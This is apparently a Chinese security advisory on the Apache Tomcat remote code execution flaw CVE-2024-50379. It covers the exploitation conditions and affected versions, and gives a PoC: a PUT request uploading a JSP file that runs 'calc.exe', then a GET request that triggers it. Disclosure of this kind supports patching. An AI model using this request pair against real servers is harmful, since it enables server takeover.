#  【高危 含POC】Tomcat 远程代码执行漏洞(CVE-2024-50379)   
原创 安全透视镜  网络安全透视镜   2024-12-18 06:36  
  
**一、漏洞描述**  
  
Apache Tomcat 远程代码执行漏洞，该漏洞允许攻击者在特定条件下绕过Tomcat的大小写检查，上传恶意文件并执行远程代码，可能导致服务器被完全控制，数据泄露或服务中断。  
  
****  
**二、利用条件**  
  
在Windows系统下启用PUT请求方式，并将readonly初始化参数设置为非默认值 false。在负载下并发读取和上传同一文件可以绕过 Tomcat 的大小写检查，导致上传的文件将其视为 JSP，从而导致远程代码执行。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS62kvbcyAm2h4dqlaUvf4duDsMm8Vqr4KMExR6XVhMg8Ie47Wohbd0vwPgtl49puzN87ia26CiaCGhg/640?wx_fmt=png&from=appmsg "")  
  
  
**三、影响版本**  
  
11.0.0-M1 <= Apache Tomcat < 11.0.2  
  
10.1.0-M1 <= Apache Tomcat < 10.1.34  
  
9.0.0.M1 <= Apache Tomcat < 9.0.98  
  
  
**四、漏洞POC**  
  
并发读取和上传同一文件  
```
PUT /d.Jsp·HTTP/1.1
Content-Type:application/json
Host:

aa<%·Runtime.getRuntime().exec("calc.exe");%>
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS62kvbcyAm2h4dqlaUvf4duCAeibWTwUHWIHom3RibEjrWbyatfq5WOysGdSOLyBANTxgVWRibdIWLfA/640?wx_fmt=png&from=appmsg "")  
```
GET /d.jsp HTTP/1.1
Content-Type:application/json
Host:
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS62kvbcyAm2h4dqlaUvf4duNxCEgYucz3JJbPMLmkEIGzqbeyzPBUicRIicrKtMvLIdn90ElnCSkPCQ/640?wx_fmt=png&from=appmsg "")  
  
  
参考：  
  
https://mp.weixin.qq.com/s/mh23G7oNJ-XsJRUbHWnmlg  
  
https://mp.weixin.qq.com/s?__biz=MzIzNDU5Mzk2OQ==&mid=2247486318&idx=1&sn=93c203e68a7de391e374b0a3cfb18297  
  
  
